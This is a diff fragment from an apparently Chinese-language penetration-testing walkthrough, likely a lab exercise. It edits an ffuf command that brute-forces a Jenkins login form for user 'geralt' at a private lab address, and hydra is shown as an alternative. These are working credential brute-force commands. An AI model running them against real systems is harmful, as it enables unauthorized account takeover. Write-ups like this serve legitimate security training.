@@ -33,7 +33,7 @@ hydra -l geralt -P pass 192.168.5.40 -s 8080 http-post-form "/j_spring_security_
 或者使用 ffuf 进行爆破：
 
 ```
-ffuf -c -X POST -w pass -u http://192.168.5.40:8080/j_spring_security_check -H 'Content-Type: application/x-www-form-urlencoded' -d 'j_username=geralt&j_password=FUZZ&from=%2F&Submit=' -fr 'loginError'
+ffuf -t 100 -c -X POST -w pass -u http://192.168.5.40:8080/j_spring_security_check -H 'Content-Type: application/x-www-form-urlencoded' -d 'j_username=geralt&j_password=FUZZ&from=%2F&Submit=' -fr 'loginError'
 ```
 
 先将请求用 BP 拦截，保存到文件中 req.txt：
